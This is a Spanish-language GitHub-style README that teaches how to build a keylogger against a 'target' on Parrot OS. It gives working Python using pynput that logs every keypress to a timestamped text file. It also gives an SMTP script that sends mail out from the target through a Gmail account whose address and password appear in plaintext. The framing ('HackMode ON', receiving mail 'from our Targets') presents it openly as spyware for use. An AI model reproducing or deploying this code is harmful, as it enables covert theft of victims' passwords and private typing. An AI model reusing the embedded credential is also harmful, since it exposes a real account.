# --> TARGET --->> PARROT OS 


* Requerimientos : Instalar pynput

```bash
pip install pynput
``` 
# Importante: reinicia tu editor de codigo despues de instalar pynput.

# Apreta el HackMode > ON!

```bash
from pynput.keyboard import Listener

def capturar_teclas(key):
    print(key)
    
with Listener(on_press=capturar_teclas) as l:
    l.join()
```   

![EMPEZAMOS A CAPTURAR](https://user-images.githubusercontent.com/97669969/159133261-b7100e64-e532-4f0b-a776-ee9ca6c859ae.png)
* Empezamos a capturar las teclas de nuestra target.



# Guardamos todo en un documento '.txt'.

```bash

from pynput.keyboard import Listener
import datetime

d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

file = open('keylogger-{}.txt'.format(d),'w')

        
def capturar_teclas(key):
    
    key = str(key)
    if key == 'Key.enter':
        file.write("\n")
    elif key == 'Key.space':
        file.write(" ")
    elif key == 'Key.backspace':
        file.write('%BORRAR%')
    else:
        file.write(key.replace("'",""))
    print(key)

with Listener(on_press=capturar_teclas) as l:
    l.join()
```

![guradar txt](https://user-images.githubusercontent.com/97669969/159135961-8b358780-7b10-44d7-b568-703aa8a0b0d6.png)
* El documento .txt esta creado, incluso implementamos un segundo .txt con fechas y hora , diario.

# Envio de correo con Gmail.com
# HackMode TIP! : a partir de 30 de mayo del 2022 gmail bloquea todas las apps noseguras.
* PARA ESO : en tu cuenta de google debes Permitir el acceso de aplicaciones menos seguras: en 'SÍ'

![gmail no seguras](https://user-images.githubusercontent.com/97669969/159137846-683e2398-b806-4292-86c6-d71bc174b67d.png)


```bash
from http import server
import smtplib

mensaje = "Subject:Correo desde Target1 \nHola desde email.py"

server_smtp = smtplib.SMTP("smtp.gmail.com",587)

server_smtp.starttls()

server_smtp.login("deniseduranbybit@gmail.com","Deniseduran2@")

server_smtp.sendmail("deniseduranbybit@gmail.com","deniseduranbybit@gmail.com", mensaje)

server_smtp.quit()

print("Correo enviando correctamente")
```

![envio de correo parrot](https://user-images.githubusercontent.com/97669969/159138025-d4a906b7-e5dd-4f8b-af83-08a57512966b.png)



* Recibimos el correo desde nuestras !Targets!

![corre envio ubuntu](https://user-images.githubusercontent.com/97669969/159137793-d7097c7b-a3ce-4455-8231-265b10f91d10.png)



